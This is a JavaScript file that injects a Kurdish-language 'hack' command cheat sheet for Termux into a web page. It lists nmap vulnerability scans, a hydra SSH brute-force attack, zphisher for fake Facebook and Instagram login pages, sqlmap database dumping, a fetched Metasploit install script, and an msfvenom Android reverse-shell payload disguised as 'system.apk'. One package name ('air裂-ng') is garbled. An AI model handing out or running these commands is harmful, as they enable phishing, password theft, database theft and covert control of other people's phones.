const hackData = [
    // --- بەشی پشکنین و کۆکردنەوەی زانیاری ---
    { c: "pkg install nmap -y", m: "دابەزاندنی بەهێزترین سکنەری جیهان بۆ دۆزینەوەی کەلێن" },
    { c: "nmap -A -v [IP_Address]", m: "پشکنینی گشتگیر بۆ زانینی جۆری سیستەم و پۆرتە کراوەکان" },
    { c: "nmap --script vuln [Target]", m: "گەڕان بەدوای کێشە و کەلێنە ئەمنییەکان لە سایت یان ئایپیدا" },
    { c: "whois [domain.com]", m: "هێنانی زانیاری خاوەن سایت و بەرواری کڕین و ماوەی بەسەرچوون" },
    { c: "nslookup [domain.com]", m: "دۆزینەوەی ئایپی ڕاستەقینەی هەر سایتێک لە جیهاندا" },

    // --- بەشی پاراستن و هێرشی نێتۆرک ---
    { c: "pkg install hydra -y", m: "ئامرازی تاقیکردنەوەی پاسۆرد (Brute Force) بۆ SSH, FTP, Gmail" },
    { c: "hydra -l admin -P passlist.txt [IP] ssh", m: "هێرشکردنە سەر سێرڤەر بۆ دۆزینەوەی پاسۆردی SSH" },
    { c: "pkg install tshark -y", m: "وەشانی تێرمیناڵی Wireshark بۆ چاودێریکردنی هاتوچۆی نێتۆرک" },
    { c: "netstat -an", m: "بینینی هەموو ئەو پەیوەندییانەی ئێستا بە ئامێرەکەتەوە بەستراونەتەوە" },
    { c: "ifconfig", m: "زانینی ئایپی ناوخۆیی و ماک ئەدرێسی مۆبایلەکەت" },

    // --- بەشی سۆشیاڵ ئینجینێرینگ و فیشینگ ---
    { c: "pkg install git python php -y", m: "ئامادەکردنی ژینگەی پێویست بۆ کارپێکردنی سکرێپتی فیشینگ" },
    { c: "git clone https://github.com/htr-tech/zphisher", m: "دابەزاندنی باشترین ئامرازی دروستکردنی لاپەڕەی ساختە" },
    { c: "cd zphisher && bash zphisher.sh", m: "دەستپێکردنی پڕۆسەی دروستکردنی لاپەڕەی ساختەی فەیسبووک و ئینستا" },

    // --- بەشی وێب و داتابەیس ---
    { c: "pkg install sqlmap -y", m: "ئامرازی هاککردنی داتابەیسی سایتەکان کە کێشەی SQLـیان هەیە" },
    { c: "sqlmap -u [URL] --dbs", m: "هێنانی هەموو ناوەکانی ناو داتابەیسی سایتێکی دیاریکراو" },
    { c: "sqlmap -u [URL] --tables -D [DB_Name]", m: "بینینی خشتەکانی ناو داتابەیس (وەک ناوی بەکارهێنەر و پاسۆرد)" },

    // --- بەشی میتاسپڵۆیت (Metasploit) ---
    { c: "pkg install wget -y && wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh", m: "داگرتنی گەورەترین فەریمۆرکی هاکینگ لە جیهاندا" },
    { c: "msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 R > system.apk", m: "دروستکردنی فایلی هاک بۆ کۆنتڕۆڵکردنی مۆبایلی ئەندرۆید" },
    { c: "msfconsole", m: "کردنەوەی ژینگەی میتاسپڵۆیت بۆ کۆنتڕۆڵکردنی ئامێرە هاککراوەکان" },

    // --- بەشی وایفای (WiFi) ---
    { c: "pkg install air裂-ng", m: "کۆمەڵە ئامرازێک بۆ پشکنین و شکاندنی وایفای (تایبەت بە ڕوت)" },
    { c: "iwconfig", m: "پشکنینی ئەوەی ئایا کارتەکەت دۆخی Monitor Mode وەردەگرێت" }
];

// لێرەدا فەرمانەکان بار دەکەین بۆ ناو پەنجەرەکە
const hackBox = document.getElementById('hack-data');
if (hackBox) {
    hackData.forEach(item => {
        hackBox.innerHTML += `
            <div class="cmd-item" style="border-left: 3px solid #ff4141; padding: 10px; margin-bottom: 10px; background: rgba(255,0,0,0.05);">
                <code class="cmd-text" style="color: #ff9999; font-weight: bold; font-size: 15px;">${item.c}</code>
                <span class="cmd-desc" style="display: block; color: #ccc; margin-top: 5px; font-family: 'Arial'; text-align: right; direction: rtl;">// ${item.m}</span>
            </div>`;
    });
}
